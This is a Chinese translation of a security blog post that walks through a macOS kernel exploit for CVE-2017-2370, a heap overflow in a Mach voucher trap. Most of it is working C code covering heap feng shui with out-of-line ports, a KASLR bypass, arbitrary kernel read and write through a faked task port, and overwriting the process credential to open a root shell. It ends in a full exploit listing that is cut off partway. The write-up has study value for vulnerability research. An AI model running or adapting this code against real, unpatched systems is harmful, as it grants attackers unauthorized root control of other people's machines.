> 原文链接: https://www.anquanke.com//post/id/86977 


# 【技术分享】OS X内核大揭秘之利用篇


                                阅读量   
                                **123723**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：theori.io
                                <br>原文地址：[http://theori.io/research/korean/osx-kernel-exploit-2](http://theori.io/research/korean/osx-kernel-exploit-2)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01b91c674d9e46e645.png)](https://p4.ssl.qhimg.com/t01b91c674d9e46e645.png)

译者：[天鸽](http://bobao.360.cn/member/contribute?uid=145812086)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



传送门

[【技术分享】OS X内核大揭秘之基础篇](http://bobao.360.cn/learning/detail/4501.html)****

**<br>**

**背景知识**

**OS X 中的进程间通信（IPC）**

由于 Mach 使用了客户端-服务器的系统架构，因此客户端可以通过请求服务器进行服务。在 macOS Mach 中，进程间通信通道的终端称为 port（端口），port 被授权可以使用该通道。以下是 Mach 提供的 IPC 类型。（但是，由于体系结构变化，在以前版本中可能无法使用的 macOS 的 IPOS）

```
消息队列/信号量/通知/锁定集/ RPC
```

**关于 Mach port**

**Mach Port：**与 UNIX 的单向管道类似，是由内核管理的消息队列。有多个发送方和一个接收方。

**Port 权限：**task 信息是系统资源的集合，也可以说是资源的所有权。这些 task 允许您访问 Port（发送，接收，发送一次），称为 Port 权限。（也就是说，Port 权限是 Mach 的基本安全机制。）

**发送权限：**不受限制地将数据插入到特定的消息队列中

**一次发送权限：**将单个消息数据插入到特定的消息队列中

**接收权限：**不受限制地从特定消息队列中提取数据

**Port 集：**一组有权限的端口，在接收来自其某个成员的消息或事件时，可以将其视为单个单元。

**Port 集权限：**从多个消息队列中排除特定的消息队列

**Port 命名空间：**每个操作都与单一的端口命名空间相关联，只有当该操作具有端口命名空间的权限时, 才能对该端口进行操作。

**Dead-Name 权限：**不做任何事

**函数功能描述**

**kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags)：**

在 target 的 *address 地址处分配 size 大小的空间

**kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size)：**

在 target 的 address 地址处释放 size 大小的空间

**task_t mach_task_self()：**

将发送权限返回给发送者的 task_self 端口

**kern_return_t mach_port_allocate (ipc_space_t task, mach_port_right_t right, mach_port_name_t *name)：**

创建指定类型的端口

**kern_return_t mach_port_insert_right (ipc_space_t task, mach_port_name_t name, mach_port_poly_t right, mach_msg_type_name_t right_type)：**

授予进程端口权限

**mach_msg_return_t mach_msg (mach_msg_header_t msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t receive_limit, mach_port_t receive_name, mach_msg_timeout_t timeout, mach_port_t notify)：**

从端口发送或接收消息

**kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize)：**

按 size 大小读取与给定的 target_task 相同区域中的数据

**kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt)：**

写入与给定 target_task 相同区域中 address 处一样大的数据



**（1）堆溢出**

CVE-2017-2370 是在 macOS 10.12.2 及更早版本中的mach_voucher_extract_attr_recipe_trap（struct mach_voucher_extract_attr_recipe_args * args）函数导致的堆溢出漏洞。

mach_voucher_extract_attr_recipe_args 的结构如下所示。



```
struct mach_voucher_extract_attr_recipe_args `{`
    PAD_ARG_(mach_port_name_t, voucher_name);
    PAD_ARG_(mach_voucher_attr_key_t, key);
    PAD_ARG_(mach_voucher_attr_raw_recipe_t, recipe);
    PAD_ARG_(user_addr_t, recipe_size);
`}`;
/* osfmk/mach/mach_traps.h */
#define PAD_ARG_(arg_type, arg_name) 
  char arg_name ##_l_[PADL_(arg_type)];
  arg_type arg_name;
  char arg_name ##_r_[PADR_(arg_type)];
```

在调用 mach_voucher_extract_attr_recipe_trap() 传递参数时，可以任意操作 mach_voucher_extract_attr_recipe_args 结构体中的 mach_voucher_attr_raw_recipe_t recipe 和 user_addr_t recipe_size 值。因此，该函数被复制到函数中由 void* kalloc(vm_size_t size); 分配的内核堆区，并且由于该函数具有可操控的 args-&gt;recipe_size 而可能发生溢出。

特别地，由于可以操控 args-&gt;recipe，所以可以在溢出时创建任意数据。

Crash PoC 触发代码：



```
/* ---- FROM exp.m ---- */
uint64_t roundup(uint64_t val, uint64_t pagesize) `{`
    val += pagesize - 1;
    val &amp;= ~(pagesize - 1);
    return val;
`}`
void heap_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data, mach_port_t* voucher_port) `{`
    
    int pagesize = getpagesize();
    void* recipe_size = (void*)map(pagesize);
    *(uint64_t*)recipe_size = kalloc_size;
    uint64_t actual_copy_size = kalloc_size + overflow_length;
    uint64_t alloc_size = roundup(actual_copy_size, pagesize) + pagesize;
    uint64_t base = map(alloc_size); // unmap page
    
    uint64_t end = base + roundup(actual_copy_size, pagesize);
    mach_vm_deallocate(mach_task_self(), end, pagesize); // for copyin() stop
    
    uint64_t start = end - actual_copy_size;
    
    uint8_t* recipe = (uint8_t*)start;
    
    memset(recipe, 0x41, kalloc_size); // set kalloc size
    memcpy(recipe + kalloc_size, overflow_data, overflow_length); // set overflow bytes
    
    kern_return_t err = mach_voucher_extract_attr_recipe_trap(voucher_port, 1, recipe, recipe_size); // Trigger
`}`
/* -------------------- */
---
mach_port_t* voucher_port = MACH_PORT_NULL;
mach_voucher_attr_recipe_data_t atm_data = `{`
    .key = MACH_VOUCHER_ATTR_KEY_ATM,
    .command = MACH_VOUCHER_ATTR_ATM_CREATE
`}`;
kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&amp;atm_data, sizeof(atm_data), &amp;voucher_port);
ipc_object* fake_port = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); // alloc fake_port
void* fake_task = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); // alloc fake_task
fake_port-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK; // for clock trap
fake_port-&gt;io_lock_data[12] = 0x11;
printf("[+] Create Fake Port. Address : %llxn", (unsigned long long)fake_port);
heap_overflow(0x100, 0x8, (unsigned char *)&amp;fake_port, voucher_port);
```

**<br>**

**（2）OOL Port 风水**

正如我之前在 OOL Port 系列博客中简要提到的，我使用 OOL Port 将数据放入内核堆并使用喷射和风水技术。这是因为 OOL Port 数据在内核中会保留到收到结束信号为止。

Port 风水的步骤简要说明如下：

**创建大量端口**

**消息生成（发送，接收）**

**创建一些用作地址的虚拟端口（MACH_PORT_DEAD）**

**发送消息**

**接收消息**

**重新发送消息**

当执行上述操作时，OS 在重复发送和接收的端口收集的地址周围分配数据。

使用的代码是：



```
struct ool_send_msg`{`
    mach_msg_header_t msg_head;
    mach_msg_body_t msg_body;
    mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
`}`;
struct ool_recv_msg`{`
    mach_msg_header_t msg_head;
    mach_msg_body_t msg_body;
    mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
    mach_msg_trailer_t msg_trailer;
`}`;
struct ool_send_msg send_msg;
struct ool_recv_msg recv_msg;
mach_port_t* ool_port_fengshui()`{`
    int current_port_num = 0;
    mach_port_t* ool_ports;
    ool_ports = calloc(PORT_COUNT, sizeof(mach_port_t));
    // Part 1. Create OOL Ports
    for(current_port_num = 0; current_port_num &lt; PORT_COUNT; current_port_num++)`{` // Alloc 1024 Ports
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;ool_ports[current_port_num]); // Alloc Port
        mach_port_insert_right(mach_task_self(), ool_ports[current_port_num], ool_ports[current_port_num], MACH_MSG_TYPE_MAKE_SEND); // MACH_MSG_TYPE_MAKE_SEND Right Set.
    `}`
    // Part 2. Create Message Buffer (Spray)
    mach_port_t* use_ports = calloc(1024, sizeof(mach_port_t));
    for(int i = 0; i &lt;= 1024; i++)`{`
        use_ports[i] = MACH_PORT_DEAD;
    `}`
    /* Set MSG HEADER */
    send_msg.msg_head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    send_msg.msg_head.msgh_size = sizeof(struct ool_send_msg) - 16;
    send_msg.msg_head.msgh_remote_port = MACH_PORT_NULL;
    send_msg.msg_head.msgh_local_port = MACH_PORT_NULL; // NULL SEND
    send_msg.msg_head.msgh_reserved = 0x00;
    send_msg.msg_head.msgh_id = 0x00;
    
    /* SET MSG BODY */
    send_msg.msg_body.msgh_descriptor_count = 1;
    
    /* SET MSG OOL PORT DESCRIPTOR */
    for(int i = 0; i&lt;=16; i++)`{` // appropriate ipc-send size  
        send_msg.msg_ool_ports[i].address = use_ports;
        send_msg.msg_ool_ports[i].count = 32; // kalloc 0x100 (256)
        send_msg.msg_ool_ports[i].deallocate = 0x00;
        send_msg.msg_ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
        send_msg.msg_ool_ports[i].disposition = MACH_MSG_TYPE_MAKE_SEND;
        send_msg.msg_ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    `}`
    // Part 3. Message Fengshui
    /* SEND MSG */
    for(current_port_num = 0; current_port_num &lt; USE_PORT_START; current_port_num++)`{`
        send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
        kern_return_t send_result = mach_msg(&amp;send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(send_result != KERN_SUCCESS)`{`
            printf("[-] Error in OOL Fengshui sendnError : %sn", mach_error_string(send_result));
            exit(1);
        `}`
    `}`
    for(current_port_num = USE_PORT_END; current_port_num &lt; PORT_COUNT; current_port_num++)`{`
        send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
        kern_return_t send_result = mach_msg(&amp;send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(send_result != KERN_SUCCESS)`{`
            printf("[-] Error in OOL Fengshui sendnError : %sn", mach_error_string(send_result));
            exit(1);
        `}`
    `}`
    for(current_port_num = USE_PORT_START; current_port_num &lt; USE_PORT_END; current_port_num++)`{`
        send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
        kern_return_t send_result = mach_msg(&amp;send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(send_result != KERN_SUCCESS)`{`
            printf("[-] Error in OOL Fengshui sendnError : %sn", mach_error_string(send_result));
            exit(1);
        `}`
    `}`
    /* RECV MSG */
    for(current_port_num = USE_PORT_START; current_port_num &lt; USE_PORT_END; current_port_num += 4)`{`
        recv_msg.msg_head.msgh_local_port = ool_ports[current_port_num];
        kern_return_t recv_result = mach_msg(&amp;recv_msg.msg_head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, sizeof(struct ool_recv_msg), ool_ports[current_port_num], MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(recv_result != KERN_SUCCESS)`{`
            printf("[-] Error in OOL Fengshui recvnError : %sn", mach_error_string(recv_result));
            exit(1);
        `}`
    `}`
    /* RE-SEND MSG */
    for(current_port_num = USE_PORT_START; current_port_num &lt; USE_PORT_HALF; current_port_num += 4)`{`
        send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
        kern_return_t send_result = mach_msg(&amp;send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if(send_result != KERN_SUCCESS)`{`
            printf("[-] Error in OOL Fengshui re-sendnError : %sn", mach_error_string(send_result));
            exit(1);
        `}`
    `}`
    
    printf("[+] OOL Port Fengshui Successn");
    return ool_ports;
`}`
```

声明要在 mach_msg() 中使用的消息结构（ool_send_msg, ool_recv_msg），以便继续执行上面列出的步骤。此时，为了将数据放在 kalloc.256 中，msg_ool_ports.count 被设置为 32。

上面的消息不应该太大或太小，它应该由大小合适的成员组成。在发送-接收-重传过程后，Port 风水准备完成，OS 已经准备好使用该区域。此时，溢出会覆盖 ipc_port，攻击者所覆盖数据的地址是已知的，并且可以随意操作数据以使攻击更容易。

**<br>**

**（3）查找操作数据**

重传的过程会导致端口周围发生溢出，我们必须找到该端口。引用对象是端口使用的描述符的地址成员（在前面的步骤中填充了伪造数据），我们需要验证端口是否已更改以及端口是否有效。

使用的代码如下：



```
mach_port_t* find_manipulation_port(mach_port_t* port_list)`{`
    for(int i = 0; i &lt; USE_PORT_END; i++)`{`
        send_msg.msg_head.msgh_local_port = port_list[i];
        kern_return_t send_result = mach_msg(&amp;send_msg.msg_head, MACH_RCV_MSG | MACH_MSG_OPTION_NONE, 0, sizeof(struct ool_send_msg), port_list[i], MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        for(int k = 0; k &lt; send_msg.msg_body.msgh_descriptor_count; k++)`{` // traversing ool descriptors
            mach_port_t* tmp_port = send_msg.msg_ool_ports[k].address;
            if(tmp_port[0] != MACH_PORT_DEAD &amp;&amp; tmp_port[0] != NULL)`{` // is Manipulated? (compare 8 bytes is enough. cuz of 8 bytes overflow)
                printf("[+] Found manipulated port! %dth port : %dth descriptor =&gt; %llxn", i, k, tmp_port[0]);
                return tmp_port[0];
            `}`
        `}`
    `}`
    printf("[-] Error in Find Manipulated Portn");
    exit(1);
`}`
```

**<br>**

**（4）获取内核地址**

在 macOS 中, 内存保护技术使用 KASLR 随机化内核地址。因此，如果您有一个端口地址并且可以执行任意操作，则可以使用 clock_sleep_trap() 将 clock_list 动态加载到内核中。

使用的代码如下:



```
uint64_t get_clock_list_addr(uint64_t fake_port, mach_port_t* manipulated_port)`{`
    for(uint64_t guess_clock_addr = 0xffffff8000200000; guess_clock_addr &lt; 0xffffff80F0200000; guess_clock_addr++)`{`
        *(uint64_t *)(fake_port + TASK_GAP_IN_IPC_OBJ) = guess_clock_addr; // Traverse address
        *(uint64_t *)(fake_port + 0xa0) = 0xff;
        if(clock_sleep_trap(manipulated_port, 0, 0, 0, 0) == KERN_SUCCESS)`{`
            printf("[+] found clock_list addr : %llxn", guess_clock_addr);
            return (guess_clock_addr);
        `}`
    `}`
    printf("[-] Find clock_list addr failed.n");
    exit(1);
`}`
```

溢出的数据指向当前用户区域中创建的端口，该端口最初指向 ipc_object 的区域。 因此，你可以在内核文本地址中设置该结构的 task，然后调用 clock_sleep_strap()，如果成功，则指向时钟列表。

我们通过上述过程获得了时钟列表在内核中的地址，然后可以通过与内核头（0xfeedfacf）进行比较来获取内核地址。

使用的代码是：



```
uint64_t get_kernel_addr(uint64_t fake_port, void* fake_task, uint64_t clock_list_addr, mach_port_t* manipulated_port)`{`
    *(uint64_t*) (fake_port + TASK_GAP_IN_IPC_OBJ) = fake_task;
    *(uint64_t*) (fake_port + 0xa0) = 0xff; 
    *(uint64_t*) (fake_task + 0x10) = 0x01;  
    clock_list_addr &amp;= ~(0x3FFF);
    for(uint64_t current_addr = clock_list_addr; current_addr &gt; 0xffffff8000200000; current_addr-=0x4000) `{`
        int32_t kernel_data = 0;
        *(uint64_t*) (fake_task + TASK_INFO_GAP) = current_addr - 0x10;
        pid_for_task(manipulated_port, &amp;kernel_data);
        if (kernel_data == 0xfeedfacf) `{`
            printf("[+] Found kernel_text addr : %llxn", current_addr);
            return current_addr;
        `}`
    `}`
`}`
```

由于内核地址在 0x40000 处对齐，所以需要删除时钟列表的低 14 位，然后再减去对齐的大小并进行比较。此时，我们使用 pid_for_task() 在用户级读取内核的内存。通常，因为你无法再用户模式下读取内核内存，所以一个技巧是，通过使用你拥有的端口来调用 pid_for_task() 来读取内核内存。

pid_for_task() 函数通过从原始 Mach 任务中获取 BSD 进程的 ID 作为参数，定义如下。[bsd/vm/vm_unix.c]



```
kern_return_t
pid_for_task(
    struct pid_for_task_args *args)
`{`
    mach_port_name_t    t = args-&gt;t;
    user_addr_t        pid_addr  = args-&gt;pid;  
    proc_t p;
    task_t        t1;
    int    pid = -1;
    kern_return_t    err = KERN_SUCCESS;
    AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);
    AUDIT_ARG(mach_port1, t);
    t1 = port_name_to_task(t);
    if (t1 == TASK_NULL) `{`
        err = KERN_FAILURE;
        goto pftout;
    `}` else `{`
        p = get_bsdtask_info(t1);
        if (p) `{`
            pid  = proc_pid(p);
            err = KERN_SUCCESS;
        `}` else if (is_corpsetask(t1)) `{`
            pid = task_pid(t1);
            err = KERN_SUCCESS;
        `}`else `{`
            err = KERN_FAILURE;
        `}`
    `}`
    task_deallocate(t1);
pftout:
    AUDIT_ARG(pid, pid);
    (void) copyout((char *) &amp;pid, pid_addr, sizeof(int));
    AUDIT_MACH_SYSCALL_EXIT(err);
    return(err);
`}`
```

也就是说，可以使用 get_bsdtask_info(t1) 读取内核内存，并使用 proc_pid() 读取 PID 值。

**<br>**

**（5）查找当前进程和内核进程**

在 macOS 中，所有当前正在运行的进程的信息都存储在 _allproc 中。

```
extern struct proclist allproc; /* List of all processes. */
```

_allproc 将进程链接到链表结构中，并且可以通过 nm /mach_kernel|grep allproc 命令获取偏移量。

下面是 proc 的结构信息。[bsd/sys/proc_internal.h]



```
struct    proc `{`
    LIST_ENTRY(proc) p_list;        /* List of all processes. */
    pid_t        p_pid;            /* Process identifier. (static)*/
    void *         task;            /* corresponding task (static)*/
    struct    proc *    p_pptr;             /* Pointer to parent process.(LL) */
    pid_t        p_ppid;            /* process's parent pid number */
    pid_t        p_pgrpid;        /* process group id of the process (LL)*/
    uid_t        p_uid;
    gid_t        p_gid;
    uid_t        p_ruid;
    gid_t        p_rgid;
    uid_t        p_svuid;
    gid_t        p_svgid;
    uint64_t    p_uniqueid;        /* process unique ID - incremented on fork/spawn/vfork, remains same across exec. */
    uint64_t    p_puniqueid;        /* parent's unique ID - set on fork/spawn/vfork, doesn't change if reparented. */
    lck_mtx_t     p_mlock;        /* mutex lock for proc */
    char        p_stat;            /* S* process status. (PL)*/
    char        p_shutdownstate;
    char        p_kdebug;        /* P_KDEBUG eq (CC)*/ 
    char        p_btrace;        /* P_BTRACE eq (CC)*/
    LIST_ENTRY(proc) p_pglist;        /* List of processes in pgrp.(PGL) */
    LIST_ENTRY(proc) p_sibling;        /* List of sibling processes. (LL)*/
    LIST_HEAD(, proc) p_children;        /* Pointer to list of children. (LL)*/
    TAILQ_HEAD( , uthread) p_uthlist;     /* List of uthreads  (PL) */
    LIST_ENTRY(proc) p_hash;        /* Hash chain. (LL)*/
    TAILQ_HEAD( ,eventqelt) p_evlist;    /* (PL) */
#if CONFIG_PERSONAS
    struct persona  *p_persona;
    LIST_ENTRY(proc) p_persona_list;
#endif
    lck_mtx_t    p_fdmlock;        /* proc lock to protect fdesc */
    lck_mtx_t     p_ucred_mlock;        /* mutex lock to protect p_ucred */
    /* substructures: */
    kauth_cred_t    p_ucred;        /* Process owner's identity. (PUCL) */
    struct    filedesc *p_fd;            /* Ptr to open files structure. (PFDL) */
    struct    pstats *p_stats;        /* Accounting/statistics (PL). */
    struct    plimit *p_limit;        /* Process limits.(PL) */
    struct    sigacts *p_sigacts;        /* Signal actions, state (PL) */
     int        p_siglist;        /* signals captured back from threads */
    lck_spin_t    p_slock;        /* spin lock for itimer/profil protection */
...
```

你可以实际追踪一下像 pid_for_task() （获取PID）这样的进程，并找到具有所需 PID 的进程。

使用的代码如下：



```
uint64_t get_proc_addr(uint64_t pid, uint64_t kernel_addr, void* fake_task, mach_port_t* manipulated_port)`{`
    uint64_t allproc_real_addr = 0xffffff8000ABB490 - 0xffffff8000200000 + kernel_addr;
    
    uint64_t pCurrent = allproc_real_addr;
    uint64_t pNext = pCurrent;
    while (pCurrent != NULL) `{`
        int nPID = 0;    
        *(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent;
        pid_for_task(manipulated_port, (int32_t*)&amp;nPID);
        if (nPID == pid) `{`
            return pCurrent;
        `}`
        else`{`
            *(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent - 0x10;
            pid_for_task(manipulated_port, (int32_t*)&amp;pNext);
            *(uint64_t*) (fake_task + TASK_INFO_GAP) = pCurrent - 0x0C;
            pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&amp;pNext)) + 4));
            pCurrent = pNext;
        `}`
    `}`
`}`
```

**<br>**

**（6）获取内核权限（AAR/AAW）**

为了提升权限，内核进程必须获取的信息是端口特权和内核 task。

使用的代码如下：



```
dumpdata* get_kernel_priv(uint64_t kernel_process, uint64_t* fake_port, void* fake_task, mach_port_t* manipulated_port)`{`
    dumpdata* data = (dumpdata *)malloc(sizeof(dumpdata));
    data-&gt;dump_port = malloc(0x1000);
    data-&gt;dump_task = malloc(0x1000);
    uint64_t kern_task = 0;
    *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kernel_process + 0x18) - 0x10 ;
    pid_for_task(manipulated_port, (int32_t*)&amp;kern_task);
    *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kernel_process + 0x1C) - 0x10;
    pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&amp;kern_task)) + 4));
    uint64_t itk_kern_sself = 0;
    *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + ITK_KERN_SSELF_GAP_IN_TASK) - 0x10;
    pid_for_task(manipulated_port, (int32_t*)&amp;itk_kern_sself);
    *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + ITK_KERN_SSELF_GAP_IN_TASK + 4) - 0x10;
    pid_for_task(manipulated_port, (int32_t*)(((uint64_t)(&amp;itk_kern_sself)) + 4));
    data-&gt;dump_itk_kern_sself = itk_kern_sself;
    for (int i = 0; i &lt; 256; i++) `{`
        *(uint64_t*) (fake_task + TASK_INFO_GAP) = (itk_kern_sself + i*4) - 0x10;
        pid_for_task(manipulated_port, (int32_t*)(data-&gt;dump_port + (i*4)));
    `}`
    for (int i = 0; i &lt; 256; i++) `{`
        *(uint64_t*) (fake_task + TASK_INFO_GAP) = (kern_task + i*4) - 0x10;
        pid_for_task(manipulated_port, (int32_t*)(data-&gt;dump_task + (i*4)));
    `}`
    return data;
`}`
```

在上一个过程中，因为已经获得了内核进程的地址，你可以轻松地获取内核 task。接下来，我们需要在任务结构中获取端口特权信息（itk_kern_sself）以获取端口权限，任务结构如下。[osfmk/kern/task.h]



```
struct task `{`
    /* Synchronization/destruction information */
    decl_lck_mtx_data(,lock)        /* Task's lock */
    uint32_t    ref_count;    /* Number of references to me */
    boolean_t    active;        /* Task has not been terminated */
    boolean_t    halting;    /* Task is being halted */
    /* Miscellaneous */
    vm_map_t    map;        /* Address space description */
    queue_chain_t    tasks;    /* global list of tasks */
    void        *user_data;    /* Arbitrary data settable via IPC */
#if defined(CONFIG_SCHED_MULTIQ)
    sched_group_t sched_group;
#endif /* defined(CONFIG_SCHED_MULTIQ) */
    /* Threads in this task */
    queue_head_t        threads;
    processor_set_t        pset_hint;
    struct affinity_space    *affinity_space;
    int            thread_count;
    uint32_t        active_thread_count;
    int            suspend_count;    /* Internal scheduling only */
    /* User-visible scheduling information */
    integer_t        user_stop_count;    /* outstanding stops */
    integer_t        legacy_stop_count;    /* outstanding legacy stops */
    integer_t        priority;            /* base priority for threads */
    integer_t        max_priority;        /* maximum priority for threads */
    integer_t        importance;        /* priority offset (BSD 'nice' value) */
    /* Task security and audit tokens */
    security_token_t sec_token;
    audit_token_t    audit_token;
        
    /* Statistics */
    uint64_t        total_user_time;    /* terminated threads only */
    uint64_t        total_system_time;
    
    /* Virtual timers */
    uint32_t        vtimers;
    /* IPC structures */
    decl_lck_mtx_data(,itk_lock_data)
    struct ipc_port *itk_self;    /* not a right, doesn't hold ref */
    struct ipc_port *itk_nself;    /* not a right, doesn't hold ref */
    struct ipc_port *itk_sself;    /* a send right */
    struct exception_action exc_actions[EXC_TYPES_COUNT];
                     /* a send right each valid element  */
    struct ipc_port *itk_host;    /* a send right */
    struct ipc_port *itk_bootstrap;    /* a send right */
    struct ipc_port *itk_seatbelt;    /* a send right */
    struct ipc_port *itk_gssd;    /* yet another send right */
    struct ipc_port *itk_debug_control; /* send right for debugmode commu
    nications */
    struct ipc_port *itk_task_access; /* and another send right */ 
    struct ipc_port *itk_resume;    /* a receive right to resume this task */
    struct ipc_port *itk_registered[TASK_PORT_REGISTER_MAX];
                    /* all send rights */
    struct ipc_space *itk_space;
...
```

这允许我们可以通过将内核的的 task 地址和端口特权地址复制到用户区域来间接地使用内核权限。也就是说，由于操作的端口指向 fake_port，并且 fake_port 具有内核端口权限，因此可以通过 task_get_special_port() 在任意端口上启用内核端口权限。

**<br>**

**（7）权限提升（user -&gt; root）**

现在，我们已经获得了内核权限，可以通过 mach_vm_read_overwrite() 和 mach_vm_write() 启用 AAR/AAW。如上一篇博客所述，更改 UCRED 结构的 CR_RUID 会改变进程的权限。proc 结构包含了 typedef struct ucred *kauth_cred_t; 定义的 kauth_cred_tp_ucred;。

ucred 结构如下，你可以修改 cr_ruid。



```
/*
 * In-kernel credential structure.
 *
 * Note that this structure should not be used outside the kernel, nor should
 * it or copies of it be exported outside.
 */
struct ucred `{`
    TAILQ_ENTRY(ucred)    cr_link; /* never modify this without KAUTH_CRED_HASH_LOCK */
    u_long    cr_ref;            /* reference count */
    
struct posix_cred `{`
    /*
     * The credential hash depends on everything from this point on
     * (see kauth_cred_get_hashkey)
     */
    uid_t    cr_uid;            /* effective user id */
    uid_t    cr_ruid;        /* real user id */
    uid_t    cr_svuid;        /* saved user id */
    short    cr_ngroups;        /* number of groups in advisory list */
    gid_t    cr_groups[NGROUPS];    /* advisory group list */
    gid_t    cr_rgid;        /* real group id */
    gid_t    cr_svgid;        /* saved group id */
    uid_t    cr_gmuid;        /* UID for group membership purposes */
    int    cr_flags;        /* flags on credential */
`}` cr_posix;
    struct label    *cr_label;    /* MAC label */
    /* 
     * NOTE: If anything else (besides the flags)
     * added after the label, you must change
     * kauth_cred_find().
     */
    struct au_session cr_audit;        /* user auditing data */
`}`;
```

写入数据以获取 root 权限的代码如下：



```
uint64_t cred;
mach_vm_size_t read_bytes = 8;
mach_vm_read_overwrite(kernel_port, (current_process + UCRED_GAP_IN_PROCESS), (size_t)8, (mach_vm_offset_t)(&amp;cred), &amp;read_bytes); // AAR in Kernel
vm_offset_t root_uid = 0;
mach_msg_type_number_t write_bytes = 8;
mach_vm_write(kernel_port, (cred + CR_RUID_GAP_IN_UCRED), &amp;root_uid, (mach_msg_type_number_t)write_bytes); // AAW in Kernel
system("/bin/bash"); // Get Shell
```

于是当前进程就成为了具有 root 权限（cr_ruid=0）的进程。

**<br>**

**漏洞利用代码（在 OS X 10.12.1 上通过测试）**

代码如下：****

```
#define PORT_COUNT 1024
#define USE_PORT_START 384
#define USE_PORT_HALF 512
#define USE_PORT_END 640
#define IO_BITS_ACTIVE 0x80000000
#define IKOT_CLOCK 25
#define IKOT_TASK 2
#define lck_spin_t char
#define TASK_GAP_IN_PROC 24
#define CR_RUID_GAP_IN_UCRED 24
#define TASK_GAP_IN_IPC_OBJ 104
#define ITK_KERN_SSELF_GAP_IN_TASK 232
#define UCRED_GAP_IN_PROCESS 232
#define TASK_INFO_GAP 896
#import &lt;stdio.h&gt;
#import &lt;stdlib.h&gt;
#import &lt;mach/mach.h&gt;
#import &lt;atm/atm_types.h&gt;
#import &lt;sys/mman.h&gt;
/* FROM osfmk/ipc/ipc_object.h -*/
typedef natural_t ipc_object_bits_t;
typedef natural_t ipc_object_refs_t;
typedef struct _ipc_object`{` 
    ipc_object_bits_t io_bits;
    ipc_object_refs_t io_references;
    lck_spin_t io_lock_data[1024];
`}`ipc_object;
/* ----------------------------*/
typedef struct _dumpdata`{`
    char* dump_port;
    char* dump_task;
    uint64_t dump_itk_kern_sself;
`}`dumpdata;
struct ool_send_msg`{`
    mach_msg_header_t msg_head;
    mach_msg_body_t msg_body;
    mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
`}`;
struct ool_recv_msg`{`
    mach_msg_header_t msg_head;
    mach_msg_body_t msg_body;
    mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
    mach_msg_trailer_t msg_trailer;
`}`;
struct ool_send_msg send_msg;
struct ool_recv_msg recv_msg;
mach_port_t* ool_port_fengshui()`{`
    int current_port_num = 0;
    mach_port_t* ool_ports;
    ool_ports = calloc(PORT_COUNT, sizeof(mach_port_t));
    // Part 1. Create OOL Ports
    for(current_port_num = 0; current_port_num &lt; PORT_COUNT; current_port_num++)`{` // Alloc 1024 Ports
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;ool_ports[current_port_num]); // Alloc Port
        mach_port_insert_right(mach_task_self(), ool_ports[current_port_num], ool_ports[current_port_num], MACH_MSG_TYPE_MAKE_SEND); // MACH_MSG_TYPE_MAKE_SEND Right Set.
    `}`
